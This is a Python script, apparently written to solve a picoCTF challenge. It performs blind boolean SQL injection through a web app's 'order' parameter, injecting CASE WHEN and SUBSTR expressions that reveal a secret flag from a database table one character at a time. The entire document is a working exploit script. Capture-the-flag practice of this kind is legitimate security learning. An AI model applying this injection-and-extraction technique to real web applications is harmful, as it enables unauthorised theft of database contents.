import requests
import string

# 1. Update ONLY the 5-digit number if it changed on your picoCTF screen
PORT = "65374" 
URL = f"http://crystal-peak.picoctf.net:{PORT}/"

def check(payload):
    # This logic: If True, sort by 'name'. If False, sort by 'id'.
    params = {'order': f"(CASE WHEN ({payload}) THEN name ELSE id END)"}
    try:
        # We look for the first item in the table when sorted by NAME.
        # Check your browser: what is the first name in the table? 
        # If it's 'Apple', keep this. If it's 'Almond', change it.
        r = requests.get(URL, params=params, timeout=5)
        return "Apple" in r.text[:1000] 
    except Exception as e:
        print(f"Connection Error: {e}")
        return False

flag = "picoCTF{"
chars = string.ascii_lowercase + string.digits + "_}"

print(f"[*] Starting extraction on port {PORT}...")

while not flag.endswith("}"):
    found = False
    for c in chars:
        # We test the flag character at the next position
        # If 'flags' fails, we will try the table name 'flag'
        payload = f"SUBSTR((SELECT flag FROM flags),{len(flag)+1},1)='{c}'"
        
        if check(payload):
            flag += c
            print(f"[+] Progress: {flag}")
            found = True
            break
    
    if not found:
        print("[-] Character not found. Try changing table name to 'flag' (no 's').")
        break

print(f"FINAL FLAG: {flag}")
